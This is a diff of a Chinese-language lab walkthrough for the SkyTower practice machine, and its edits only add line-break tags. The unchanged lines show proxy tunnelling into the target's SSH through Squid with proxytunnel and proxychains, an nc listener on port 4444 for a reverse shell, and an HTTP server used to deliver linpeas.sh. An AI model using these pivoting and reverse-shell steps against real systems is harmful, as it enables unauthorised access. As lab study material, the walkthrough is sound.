@@ -97,7 +97,7 @@ proxytunnel -p 192.168.146.71:3128 -d 127.0.0.1:22 -a 5555
 ```
 ![Img](../FILES/SkyTower/img-20220712145858.png)
 <br>我在登录上去之后的瞬间就被断开了连接, 这里把我整不会了, 于是我换了个思路, 使用反弹shell
-首先用/etc/proxychains4.conf加入RHOST
+<br>首先用/etc/proxychains4.conf加入RHOST
 ```
 ┌──(aacai㉿kali)-[~/Desktop/192.168.146.71]
 └─$ tail -n 5 /etc/proxychains4.conf 
@@ -107,7 +107,7 @@ proxytunnel -p 192.168.146.71:3128 -d 127.0.0.1:22 -a 5555
 #socks4 	127.0.0.1 9050
 http 192.168.146.71 3128
 ```
->然后再用proxychains 配合nmap测试一下是否成功
+<br>然后再用proxychains 配合nmap测试一下是否成功
 ```
 └─$ proxychains nmap -sT -p 22 127.0.0.1                                                                                   1 ⨯
 [proxychains] config file found: /etc/proxychains4.conf
@@ -126,8 +126,8 @@ Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
                                                                                                                                
 
 ```
-<br>成功了
-<br>接下来使用nc配合ssh登录
+<br> 成功了
+<br> 接下来使用nc配合ssh登录
 ```
 Terminal1:
 nc -nvlp 4444             
@@ -142,7 +142,7 @@ Terminal2:
 [proxychains] Strict chain  ...  192.168.146.71:3128  ...  127.0.0.1:22  ...  OK
 john@127.0.0.1's password: 
 ```
->这样Terminal1就得到了反弹回来的数据
+<br>这样Terminal1就得到了反弹回来的数据
 
 ![Img](../FILES/SkyTower/img-20220712152044.png)
 <br>然后就开始在本机上搜索, 先去web目录看一下
@@ -464,6 +464,7 @@ sara@SkyTower:~$
 ```
 <br>一样的套路再用就不礼貌了啊...
 在本地开个httpserver, 使用linpeas.sh查看一下有用的信息
+<br>
 ```
 └─$ sudo python3 -m http.server 80               
 [sudo] password for aacai: 
